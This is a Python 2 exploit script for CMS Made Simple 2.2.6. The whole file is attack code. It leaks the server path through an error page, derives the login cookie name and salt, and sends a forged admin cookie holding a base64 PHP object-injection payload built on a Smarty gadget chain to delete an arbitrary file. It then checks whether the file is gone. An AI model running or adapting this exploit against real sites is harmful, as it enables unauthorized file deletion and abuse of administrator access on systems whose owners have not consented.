#!encoding=utf-8
import requests#you need install this module
import re
import md5
import urllib
import base64
import hashlib
import phpserialize#pip install phpserialize
from bs4 import BeautifulSoup#you need install this module

domian='http://127.0.0.1:8001' #Important variable,change it to your value
version='2.2.6' #Important variable,change it to your value
ip='127.0.0.1' #Important variable,change it to your value
user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4295.400 QQBrowser/9.7.12661.400'
username='test1' #whatever you want
password='asasdsadafaf'#whatever you want
file_delete_url=domian+'/test.txt'#file name

url=domian+'/lib/tasks/class.CmsSecurityCheck.task.php'
res=requests.get(url=url)
if res.content:
	try:
		path=re.findall(r"in <b>(.*?)lib\\tasks\\class.CmsSecurityCheck.task.php",res.content)[0]
	except:
		print 'maybe url error'
		exit()
else:
	print 'network error'
	exit()
realpath=path+'lib\classes\internal\class.LoginOperations.php'+'CMSMS\LoginOperations'+version

m1 = md5.new()   
m1.update(realpath)  
#cookies name
cookies_title=m1.hexdigest() 


#unserialize pass now

#Escalate from editor user or designer user to admin
admin_index_url=domian+'/admin/index.php'
headers={ "User-Agent":user_agent,"Referer":admin_index_url}
res=requests.get(url=file_delete_url,headers=headers)
print 'File to delete:'+file_delete_url
print 'The current file content is:'+res.content
print
print 'Requesting the following page:'+admin_index_url
print 'Please wait for a moment...'
print

m2 = md5.new()
m2.update(path+'lib\classes\internal\class.LoginOperations.php')
temp_data_1=m2.hexdigest()
salt_data=[temp_data_1,ip,user_agent+version]
salt=hashlib.sha1(phpserialize.dumps(salt_data)).hexdigest()
make_data='TzoyNDoiU21hcnR5X0ludGVybmFsX1RlbXBsYXRlIjoyOntzOjY6InNtYXJ0eSI7Tzo2OiJTbWFydHkiOjE6e3M6MTM6ImNhY2hlX2xvY2tpbmciO2I6MTt9czo2OiJjYWNoZWQiO086MjI6IlNtYXJ0eV9UZW1wbGF0ZV9DYWNoZWQiOjM6e3M6OToiaXNfbG9ja2VkIjtiOjE7czo3OiJsb2NrX2lkIjtzOjY4OiJGOlx0b25nXHBocHN0dWR5XFBIUFR1dG9yaWFsXFdXV1xjbXNtYWRlc2ltcGxlLTIuMi42LWluc3RhbGxca2trLnR4dCI7czo3OiJoYW5kbGVyIjtPOjM0OiJTbWFydHlfSW50ZXJuYWxfQ2FjaGVSZXNvdXJjZV9GaWxlIjowOnt9fX0='
hash=hashlib.sha1(make_data+salt).hexdigest()#cookies value

test_admin_cookies={'_sk_':'aabbcc',cookies_title:hash+'::'+make_data}
requests.get(url=admin_index_url,headers=headers,cookies=test_admin_cookies)
print 'Try again:'+file_delete_url
res=requests.get(url=file_delete_url,headers=headers)
print 'The return content is:'+res.content
